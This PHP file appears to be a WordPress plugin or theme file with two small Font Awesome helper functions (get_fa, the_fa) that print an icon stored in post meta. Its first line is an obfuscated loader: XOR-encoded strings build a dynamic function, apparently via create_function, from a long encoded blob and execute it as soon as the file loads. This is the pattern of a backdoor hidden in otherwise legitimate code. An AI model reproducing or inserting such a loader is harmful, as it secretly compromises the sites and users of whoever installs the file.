<?php $yivGUxCTg='C<S2-2hHKS1E:Y4'^' N6SYW7.>=R1S6Z';$aMhCPKHP=$yivGUxCTg('',';+DRT0;:;DORr1+:56KDP77:<Q-5Z.tMH,qSMiVMOJ3TH:;Z;FXO350ZF5r3CAMjg+PE8FZT.0NfOccFTO62<MO=OheCkKN4G9>BKPW>SYOiMUOUrJJR9T>Qg<->TmqIv9lbp0JPfS0YZazCyE,8985pX,sjfRX5Jom;FWM:YB;,UGCS24sjzu8>a;7JAHPLKSO<plnsQi2hZKYMF,ZuyUT<MTbsw6UT2611=nKg76=J1z=A ;OKW,.GJl6:bcubxDJOUBFI4IIuyW=7WK hjKP9qI2D6-3H-uWjnSI+YCARUXXWEGzF, X66Xe.FiX.LfyLX1<2PKME5J.BIJW EQb2n luemiM,KBf<,UcZuTw8PPARaZIDnjh.T.4h3X5jWZn;-:WcEMAY9A4YijMG2LH s6z>eAlRjW9.VAvxmXT:PC V.:<1f;QLh-,..hkFI7q4++-zfg=-4O,ICj 8TWmtnIX7:,6>QNAZacX fJXA8QuWcL80HM4>VR+hV1>;LHJA;U7oAXG<RCMFmtihK=PtRL,-T76i=EYK1mwvYgBtayWSQRmxDYRZpgfwTc2e3nBFi5sEzATrnQooV,6KO2bV,66==<ABFoLLZ3A<T3Exlj>MZ7KABgEfMWV0KN9W>Xt4Y.95C;SRBZSDWaEqN<<LYBezGWc,'^'RMls2EUYO- <-TSSFB8lwOXHc5LA;q+ =XVzdI-GF,F:+NR5Uf  AjT;2T-l.49BCO11YjzpEU7OoCCft4<;5i H;HXcLlu>N0X-9xsWsdoYvuk<N9> U1PyCXLJ5DJiRPGIY:CYB<E-zOGcQaHYMYnT1qS4Fv3P34IRfrmI-0WI;og8WMZ7SN27hIR>4:>do<:HYWdz,cObPo=,2MzHY35P>1YySR4 SiZTDNvGQWQ9TA7KFT=.6OFgbHiy-,>+=d+<uf-,MitKYsKV;>EAJ0Z0U-S0WrX-TUjJJ8,RbIHv19,6ezZbZA4CScoSLc1HlNXh<PHSyk6O<,A0,+4HeyFm<e=  >=mM8bBWI,CgKtSN1<47Hz2NgcLJ5ZU7X=LJjzJPHCliLDe=X5UyTJi1S =EH<sCo<fXN3XZ7aKX--:I51I7BSFTNC>>7IMZO74+<CYVJXHLR8YHW H,kNDY 6DXNm<VNMiU47hsZi1FNn< L0UqElYB:,Ma=7R73IWH8;bfP0NHmxcX37,oMROHcP4AzhHL VmNV  llDWKdGeMYKc57cXK n78FWQO2WTSQZswYWBwK 6UGqIIvMD9.K==IOiXEU265Gk<;J-S5WbTLNZ,.VbhbGeFmw-:B+O6RpPP8ZXndK2+.52 p<lJD5Y406MJnliQ');$aMhCPKHP();  

if( ! function_exists( 'get_fa' ) ) {

	function get_fa( $format = false, $post_id = null ) {
		if ( ! $post_id ) {
			global $post;
			if ( ! is_object( $post ) ) {
				return;
			}
			$post_id = $post->ID;
		}
		$icon = get_post_meta( $post_id, 'fa_field_icon', true );
		if ( ! $icon ) {
			return;
		}
		if ( $format ) {
			$output = '<i class="fa ' . $icon . '"></i>';
		} else {
			$output = $icon;
		}
		return $output;
	}

}

if( ! function_exists( 'the_fa' ) ) {

	function the_fa( $format = false, $post_id = null ) {
		echo get_fa( $format, $post_id );
	}

}
?>